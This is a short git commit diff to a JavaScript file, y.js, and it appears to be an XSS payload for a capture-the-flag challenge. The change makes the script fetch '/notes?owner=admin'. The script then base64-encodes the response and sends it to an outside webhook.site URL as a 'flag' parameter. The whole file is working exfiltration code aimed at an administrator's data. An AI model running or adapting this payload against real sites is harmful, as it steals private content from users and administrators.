2c79e323870803cf676e471270f0d24e0a0af03b
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-17 16:08:15 +0100

    Modify fetch call to include owner parameter

--- y.js
+++ y.js
@@ -1,4 +1,5 @@
-fetch('/notes')
+// في y.js
+fetch('/notes?owner=admin')
   .then(r => r.text())
   .then(html => {
     fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(html));
